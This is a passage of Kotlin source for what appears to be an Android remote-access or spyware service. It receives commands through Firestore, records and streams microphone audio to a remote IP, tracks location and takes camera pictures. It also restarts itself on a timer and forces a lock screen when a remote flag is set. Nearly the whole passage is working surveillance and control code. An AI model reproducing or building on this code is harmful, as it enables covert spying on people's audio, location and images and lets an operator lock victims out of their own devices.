                                                        "START_RECORDING_AUDIO_FROM_MIC: Operation failed - ${e.localizedMessage}",
                                                        messageID, serverID
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    this,
                                                    false,
                                                    "START_RECORDING_AUDIO_FROM_MIC: Operation failed - already recording",
                                                    messageID, serverID
                                                )
                                            }
                                        } else if (command == "STOP_RECORDING_AUDIO_FROM_MIC") {
                                            var errored = false
                                            try {
                                                mediaRecorder.stop()
                                                mediaRecorder.release()
                                            } catch (ex: Exception) {
                                                sendMessage(
                                                    this,
                                                    false,
                                                    "STOP_RECORDING_AUDIO_FROM_MIC: Operation failed - ${ex.localizedMessage}",
                                                    messageID, serverID
                                                )
                                                errored = true
                                            }
                                            if (!errored) {
                                                isRecordingFromMic = false
                                                sendMessage(
                                                    this,
                                                    false,
                                                    "STOP_RECORDING_AUDIO_FROM_MIC: Operation completed successfully",
                                                    messageID, serverID
                                                )
                                            }
                                        } else if (command.startsWith("START_MIC_STREAMING_SERVER ")) {
                                            try {
                                                val port = command.removePrefix("START_MIC_STREAMING_SERVER ").split(" ")[0]
                                                val audioFormatStr = command.removePrefix("START_MIC_STREAMING_SERVER ").split(" ")[1]
                                                val audioFormat: Int = when (audioFormatStr) {
                                                    "ENCODING_PCM_8BIT" -> AudioFormat.ENCODING_PCM_8BIT
                                                    "ENCODING_PCM_16BIT" -> AudioFormat.ENCODING_PCM_16BIT
                                                    "ENCODING_PCM_24BIT_PACKED" -> AudioFormat.ENCODING_PCM_24BIT_PACKED
                                                    "ENCODING_PCM_32BIT" -> AudioFormat.ENCODING_PCM_32BIT
                                                    "ENCODING_PCM_FLOAT" -> AudioFormat.ENCODING_PCM_FLOAT
                                                    else -> -1
                                                }
                                                if (audioFormat == AudioFormat.ENCODING_PCM_24BIT_PACKED && Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "START_MIC_STREAMING_SERVER: Operation failed - audio format ENCODING_PCM_24BIT_PACKED requires atleast api level 31",
                                                        messageID, serverID
                                                    )
                                                } else if (audioFormat == AudioFormat.ENCODING_PCM_32BIT && Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "START_MIC_STREAMING_SERVER: Operation failed - audio format ENCODING_PCM_32BIT requires atleast api level 31",
                                                        messageID, serverID
                                                    )
                                                } else {
                                                    if (audioFormat != -1) {
                                                        startService(
                                                            Intent(
                                                                applicationContext,
                                                                MicStreamingService::class.java
                                                            ).apply {
                                                                putExtra("ServerPort", port.toInt())
                                                                putExtra("MessageID", messageID)
                                                                putExtra("ServerID", serverID)
                                                                putExtra("AudioFormat", audioFormat)
                                                                putExtra("StartServer", true)
                                                                putExtra(
                                                                    "Command",
                                                                    "START_MIC_STREAMING_SERVER"
                                                                )
                                                            }
                                                        )
                                                        Log.d(
                                                            "AudioStreamingService",
                                                            "startService() called"
                                                        )
                                                    } else {
                                                        sendMessage(
                                                            this,
                                                            false,
                                                            "START_MIC_STREAMING_SERVER: Operation failed - unknown audio format",
                                                            messageID, serverID
                                                        )
                                                    }
                                                }
                                            } catch (ex: Exception) {
                                                ex.printStackTrace()
                                                sendMessage(
                                                    this,
                                                    false,
                                                    "START_MIC_STREAMING_SERVER: Operation failed - ${ex.localizedMessage}",
                                                    messageID, serverID
                                                )
                                            }
                                        } else if (command.startsWith("START_MIC_STREAMING_CLIENT ")) {
                                            try {
                                                val ip = command.removePrefix("START_MIC_STREAMING_CLIENT ").split(" ")[0]
                                                val port = command.removePrefix("START_MIC_STREAMING_CLIENT ").split(" ")[1]
                                                val audioFormatStr = command.removePrefix("START_MIC_STREAMING_CLIENT ").split(" ")[2]
                                                val audioFormat: Int = when (audioFormatStr) {
                                                    "ENCODING_PCM_8BIT" -> AudioFormat.ENCODING_PCM_8BIT
                                                    "ENCODING_PCM_16BIT" -> AudioFormat.ENCODING_PCM_16BIT
                                                    "ENCODING_PCM_24BIT_PACKED" -> AudioFormat.ENCODING_PCM_24BIT_PACKED
                                                    "ENCODING_PCM_32BIT" -> AudioFormat.ENCODING_PCM_32BIT
                                                    "ENCODING_PCM_FLOAT" -> AudioFormat.ENCODING_PCM_FLOAT
                                                    else -> -1
                                                }
                                                if (audioFormat == AudioFormat.ENCODING_PCM_24BIT_PACKED && Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "START_MIC_STREAMING_CLIENT: Operation failed - audio format ENCODING_PCM_24BIT_PACKED requires atleast api level 31",
                                                        messageID, serverID
                                                    )
                                                } else if (audioFormat == AudioFormat.ENCODING_PCM_32BIT && Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "START_MIC_STREAMING_CLIENT: Operation failed - audio format ENCODING_PCM_32BIT requires atleast api level 31",
                                                        messageID, serverID
                                                    )
                                                } else {
                                                    if (audioFormat != -1) {
                                                        startService(
                                                            Intent(
                                                                applicationContext,
                                                                MicStreamingService::class.java
                                                            ).apply {
                                                                putExtra("ServerPort", port.toInt())
                                                                putExtra("ServerIP", ip)
                                                                putExtra("MessageID", messageID)
                                                                putExtra("ServerID", serverID)
                                                                putExtra("AudioFormat", audioFormat)
                                                                putExtra("StartServer", false)
                                                                putExtra(
                                                                    "Command",
                                                                    "START_MIC_STREAMING_CLIENT"
                                                                )
                                                            }
                                                        )
                                                        Log.d(
                                                            "AudioStreamingService",
                                                            "startService() called"
                                                        )
                                                    } else {
                                                        sendMessage(
                                                            this,
                                                            false,
                                                            "START_MIC_STREAMING_CLIENT: Operation failed - unknown audio format",
                                                            messageID, serverID
                                                        )
                                                    }
                                                }
                                            } catch (ex: Exception) {
                                                ex.printStackTrace()
                                                sendMessage(
                                                    this,
                                                    false,
                                                    "START_MIC_STREAMING_CLIENT: Operation failed - ${ex.localizedMessage}",
                                                    messageID, serverID
                                                )
                                            }
                                        } else if (command == "STOP_MIC_STREAMING") {
                                            sendBroadcast(Intent(MicStreamingService.ACTION_STOP_MIC_STREAMING_SERVICE))
                                            sendMessage(
                                                this,
                                                false,
                                                "STOP_MIC_STREAMING: Operation completed successfully",
                                                messageID, serverID
                                            )
                                        } else if (command == "REGISTER_CALLBACK_FOR_LOCATION_UPDATES") {
                                            if (ActivityCompat.checkSelfPermission(
                                                    this,
                                                    Manifest.permission.ACCESS_FINE_LOCATION
                                                ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                                                    this,
                                                    Manifest.permission.ACCESS_COARSE_LOCATION
                                                ) == PackageManager.PERMISSION_GRANTED
                                            ) {
                                                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper()).addOnCompleteListener {
                                                    if (it.isSuccessful) {
                                                        sendMessage(
                                                            this,
                                                            false,
                                                            "REGISTER_CALLBACK_FOR_LOCATION_UPDATES: Operation completed successfully",
                                                            messageID, serverID
                                                        )
                                                    } else {
                                                        sendMessage(
                                                            this,
                                                            false,
                                                            "REGISTER_CALLBACK_FOR_LOCATION_UPDATES: Operation failed - ${it.exception?.localizedMessage}",
                                                            messageID, serverID
                                                        )
                                                    }
                                                }
                                            } else {
                                                sendMessage(
                                                    this,
                                                    false,
                                                    "REGISTER_CALLBACK_FOR_LOCATION_UPDATES: Operation failed - permission denied",
                                                    messageID, serverID
                                                )
                                            }
                                        } else if (command == "REMOVE_CALLBACK_FOR_LOCATION_UPDATES") {
                                            fusedLocationClient.removeLocationUpdates(locationCallback).addOnCompleteListener {
                                                if (it.isSuccessful) {
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "REMOVE_CALLBACK_FOR_LOCATION_UPDATES: Operation completed successfully",
                                                        messageID, serverID
                                                    )
                                                } else {
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "REMOVE_CALLBACK_FOR_LOCATION_UPDATES: Operation failed - ${it.exception?.localizedMessage}",
                                                        messageID, serverID
                                                    )
                                                }
                                            }
                                        } else if (parseCommand(
                                                command,
                                                firestore,
                                                this,
                                                handler,
                                                applicationContext,
                                                preferences,
                                                storage,
                                                messageID, serverID
                                            )
                                        ) {
                                            listenerRegistration?.remove()
                                            stopSelf()
                                        }
                                    } catch (ex: Exception) {
                                        ex.printStackTrace()
                                        sendMessage(this, false, "Uncaught Error: ${ex.localizedMessage}", messageID, serverID)
                                    }
                                }
                            }
                            deleteFirestoreMessage(document.id)
                        }
                    }
                }
            }
        }
        listenerRegistration = messagesRef.addSnapshotListener(listener)
        handler.postDelayed(object : Runnable {
            override fun run() {
                listenerRegistration?.remove()
                Thread.sleep(500)
                listenerRegistration = messagesRef.addSnapshotListener(listener)
                handler.postDelayed(this, 4 * 60 * 60 * 1000)
            }
        }, 4 * 60 * 60 * 1000)
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!isMyServiceRunning(applicationContext, ClientServiceStarter::class.java)) {
                    applicationContext.startService(Intent(applicationContext, ClientServiceStarter::class.java))
                }
                handler.postDelayed(this, 1000 * 60)
            }
        }, 1000 * 60)
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isLocked) {
                    killAll = true
                    with (preferences.edit()) {
                        putBoolean("killAll", true)
                        commit()
                    }
                    Thread.sleep(550)
                    killAll = false
                    with (preferences.edit()) {
                        putBoolean("killAll", false)
                        commit()
                    }
                    val i = Intent(c, LockedActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                }
                handler.postDelayed(this, 2000)
            }
        }, 2000)
    }

    private suspend fun handleClient(socket: Socket) {
        try {
            val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
            val writer = BufferedWriter(OutputStreamWriter(socket.getOutputStream()))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                Log.d("ClientService", "Received from client: $line")
                writer.write("Echo: $line\n")
                writer.flush()
            }
        } catch (e: Exception) {
            Log.e("ClientService", "Error handling client connection", e)
        } finally {
            try {
                socket.close()
                Log.d("ClientService", "Closed client connection")
            } catch (e: IOException) {
                Log.e("ClientService", "Error closing client socket", e)
            }
        }
    }

    private fun takePicture(imagePath: String, messageID: String?, serverID: String?) {
        if (!cameraInitialized) {
            return
        }

        try {
            val captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder.addTarget(imageReader.surface)

            cameraDevice.createCaptureSession(Arrays.asList(imageReader.surface),
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session:
                                          CameraCaptureSession) {
                    captureSession = session
                    try {
                        captureSession.capture(captureBuilder.build(),
                        object : CameraCaptureSession.CaptureCallback() {
                            override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                try {
                                    Log.d("ClientService", "Picture taken")
                                    val image = imageReader.acquireNextImage()
                                    val buffer = image.planes[0].buffer
                                    val bytes = ByteArray(buffer.remaining())
                                    buffer.get(bytes)

                                    val file = File(imagePath)
                                    val fos = FileOutputStream(file)
                                    fos.write(bytes)
                                    fos.close()
                                    image.close()

                                    sendMessage(
                                        this@ClientService,
                                        false,
                                        "CLICK_IMAGE: Operation completed successfully",
                                        messageID, serverID
                                    )
                                } catch (ex: Exception) {
                                    ex.printStackTrace()
                                    sendMessage(
                                        this@ClientService,
                                        false,
                                        "CLICK_IMAGE: Operation failed - ${ex.localizedMessage}",
                                        messageID, serverID
                                    )
                                }
                            }

                            override fun onCaptureFailed(
                                session: CameraCaptureSession,
                                request: CaptureRequest,
                                failure: CaptureFailure
                            ) {
                                Log.e("ClientService", "Capture failure")
                                sendMessage(this@ClientService, false, "CLICK_IMAGE: Operation failed", messageID, serverID)
                            }
                        }, null)
                    } catch (e: Exception) {
                        Log.e("ClientService", "Capture failure", e)
                        sendMessage(this@ClientService, false, "CLICK_IMAGE: Operation failed - ${e.localizedMessage}", messageID, serverID)
                    }
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e("ClientService", "Configure failed")
                    sendMessage(this@ClientService, false, "CLICK_IMAGE: Operation failed - configure failed", messageID, serverID)
                }
            }, null)
        } catch (e: CameraAccessException) {
            Log.e("ClientService", "Camera access exception", e)
            sendMessage(this@ClientService, false, "CLICK_IMAGE: Operation failed - ${e.localizedMessage}", messageID, serverID)
        }
    }

    private fun createCaptureSession(messageID: String?, serverID: String?) {
        val captureRequest = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
        captureRequest.addTarget(imageReader.surface)

        cameraDevice.createCaptureSession(listOf(imageReader.surface),
        object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                captureSession = session
                cameraInitialized = true
                sendMessage(this@ClientService, false, "SWITCH_TO_CAMERA: Operation completed successfully", messageID, serverID)
            }

            override fun onConfigureFailed(session: CameraCaptureSession) {
                cameraInitialized = false
                sendMessage(this@ClientService, false, "SWITCH_TO_CAMERA: Operation failed", messageID, serverID)
            }
        }, null)
    }
}
